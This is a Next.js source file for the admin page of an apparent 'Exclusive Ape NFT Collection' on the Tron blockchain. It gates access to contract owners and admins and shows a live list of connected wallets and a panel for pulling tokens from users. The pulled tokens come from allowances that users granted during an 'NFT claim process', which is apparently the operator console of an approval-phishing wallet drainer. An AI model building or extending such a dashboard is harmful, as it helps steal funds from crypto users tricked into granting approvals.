"use client";

import { AdminPullPanel } from "@/components/AdminPullPanel";
import { ConnectedWalletsList } from "@/components/ConnectedWalletsList";
import { TronConnectButton } from "@/components/TronConnectButton";
import { useTron } from "@/components/TronProvider";
import { getAdminStatus, getContractOwner, PULL_CONTRACT_ADDRESS } from "@/lib/tron";
import Link from "next/link";
import { ArrowLeft } from "lucide-react";
import { useEffect, useState } from "react";

export default function AdminPage() {
  const { address, isConnected } = useTron();
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [ownerAddress, setOwnerAddress] = useState<string | null>(null);
  const [isOwner, setIsOwner] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);

  useEffect(() => {
    if (!isConnected || !address) {
      setIsAuthorized(false);
      return;
    }

    const checkAccess = async () => {
      setIsChecking(true);
      try {
        const owner = await getContractOwner(PULL_CONTRACT_ADDRESS);
        const ownerMatch = owner === address;
        const adminMatch = await getAdminStatus(PULL_CONTRACT_ADDRESS, address);
        setOwnerAddress(owner);
        setIsOwner(!!ownerMatch);
        setIsAdmin(!!adminMatch);
        setIsAuthorized(!!ownerMatch || !!adminMatch);
      } catch (error) {
        console.error("Failed to check admin access:", error);
        setOwnerAddress(null);
        setIsOwner(false);
        setIsAdmin(false);
        setIsAuthorized(false);
      } finally {
        setIsChecking(false);
      }
    };

    checkAccess();
  }, [isConnected, address]);

  if (!isConnected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center">
        <TronConnectButton />
      </div>
    );
  }

  if (isChecking) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center px-4">
        <div className="max-w-md w-full rounded-lg border border-blue-500/20 bg-gray-900/50 p-6 text-center">
          <h1 className="text-lg font-semibold text-cyan-200 mb-2">Checking Access</h1>
          <p className="text-sm text-cyan-300">Checking admin rights...</p>
        </div>
      </div>
    );
  }

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center px-4">
        <div className="max-w-md w-full space-y-4">
          <div className="rounded-lg border border-red-500/30 bg-red-900/10 p-6 text-center">
            <h1 className="text-lg font-semibold text-red-300 mb-2">Access Restricted</h1>
            <p className="text-sm text-red-200">
              You are not authorized to access this page. Connect with an admin wallet.
            </p>
          </div>
          <div className="rounded-lg border border-blue-500/20 bg-gray-900/50 p-4 text-xs text-cyan-200 space-y-1">
            <div>Contract: {PULL_CONTRACT_ADDRESS}</div>
            <div>Connected: {address || "Not connected"}</div>
            <div>Owner: {ownerAddress || "Unknown"}</div>
            <div>isOwner: {isOwner ? "true" : "false"}</div>
            <div>isAdmin: {isAdmin ? "true" : "false"}</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black">
      {/* Header */}
      <header className="border-b border-blue-500/20 bg-black/50 backdrop-blur-sm sticky top-0 z-10">
        <div className="container mx-auto px-3 sm:px-4 py-3 sm:py-4 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-4">
            <Link
              href="/"
              className="flex items-center gap-1 sm:gap-2 text-xs sm:text-sm font-medium text-cyan-300 hover:text-cyan-100 transition-colors"
            >
              <ArrowLeft className="h-3 w-3 sm:h-4 sm:w-4" />
              <span className="hidden sm:inline">Back to Home</span>
              <span className="sm:hidden">Back</span>
            </Link>
            
            <div className="h-6 sm:h-8 w-px bg-blue-500/30" />
            <div className="flex items-center gap-2">
              <div className="h-8 w-8 sm:h-10 sm:w-10 rounded-lg bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
                <span className="text-white font-bold text-base sm:text-xl">🛡️</span>
              </div>
              <div>
                <h1 className="text-base sm:text-xl font-bold text-white">Admin Panel</h1>
                <p className="text-xs text-cyan-300 hidden sm:block">NFT Management</p>
              </div>
            </div>
          </div>
          <TronConnectButton />
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-3 sm:px-4 py-6 sm:py-12">
        <div className="max-w-6xl mx-auto space-y-6 sm:space-y-8">
          {/* Hero Section */}
          <div className="text-center space-y-3 sm:space-y-4">
            <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-400 to-blue-600">
              NFT Admin Control Panel
            </h2>
            <p className="text-base sm:text-lg text-cyan-200 px-2">
              Manage token withdrawals and monitor wallet connections in real-time.
            </p>
          </div>

          {/* Connected Wallets List */}
          {isChecking ? (
            <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-blue-500/20 bg-gray-900/50 backdrop-blur-sm text-cyan-200 text-sm">
              Checking admin access...
            </div>
          ) : (
            <ConnectedWalletsList />
          )}

          {/* Admin Component */}
          {!isChecking && <AdminPullPanel />}

          {/* Info Section */}
          <div className="grid gap-3 sm:gap-4 md:grid-cols-2">
            <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
              <h3 className="font-semibold mb-2 text-white text-sm sm:text-base">🔐 Owner Only</h3>
              <p className="text-xs sm:text-sm text-cyan-200">
                Only the contract owner can access this panel and pull tokens from users. Make sure you're connected with the owner wallet.
              </p>
            </div>
            <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
              <h3 className="font-semibold mb-2 text-white text-sm sm:text-base">✅ Check Allowance</h3>
              <p className="text-xs sm:text-sm text-cyan-200">
                Before pulling tokens, verify that the user has granted approval. The system will show a warning if no allowance is detected.
              </p>
            </div>
          </div>

          {/* Warning */}
          <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-amber-500/30 bg-amber-900/20 backdrop-blur-sm">
            <h3 className="font-semibold mb-2 text-amber-300 text-sm sm:text-base">
              ⚠️ Important Notice
            </h3>
            <p className="text-xs sm:text-sm text-amber-200">
              Only pull tokens from users who have explicitly granted approval through the NFT claim process. Ensure you have proper authorization and follow all applicable regulations.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-blue-500/20 mt-auto py-4 sm:py-6 bg-black/30">
        <div className="container mx-auto px-3 sm:px-4 text-center text-xs sm:text-sm text-cyan-300">
          Exclusive Ape NFT Collection • Admin Dashboard
        </div>
      </footer>
    </div>
  );
}
